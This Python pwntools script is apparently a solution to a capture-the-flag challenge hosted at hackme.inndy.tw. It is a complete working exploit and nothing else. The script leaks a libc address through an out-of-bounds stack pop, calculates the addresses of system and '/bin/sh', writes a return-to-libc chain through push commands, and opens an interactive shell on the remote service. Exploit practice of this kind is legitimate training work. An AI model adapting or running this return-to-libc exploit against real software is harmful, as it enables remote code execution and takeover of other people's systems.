from pwn import *
#context.log_level='debug'

libc = ELF('./libc-2.23.so.i386')


def pop(target):
    target.sendline('p')


def push(target, value):
    target.sendline('i ' + value)


def main():
    target = remote('hackme.inndy.tw', 7716)
    target.recvuntil('Cmd >>')
    pop(target)
    target.recvuntil('Pop -> -1')
    target.recvuntil('Cmd >>')
    push(target, '93')
    pop(target)
    target.recvuntil('Pop -> ')
    libc_addr = int(target.recv(10))&0xffffffff
    log.info(hex(libc_addr))
    libc_base = libc_addr - libc.symbols['__libc_start_main'] - 0xf7
    sys_addr = libc_base + libc.symbols['system']
    binsh = libc.search('/bin/sh\x00').next() + libc_base
    target.recvuntil('Cmd >>')
    push(target, str(sys_addr - (1<<32)))
    target.recvuntil('Cmd >>')
    push(target, '0')
    target.recvuntil('Cmd >>')
    push(target, str(binsh - (1<<32)))
    target.recvuntil('Cmd >>')
    target.sendline('x')
    target.interactive()




if __name__ == '__main__':
	main()
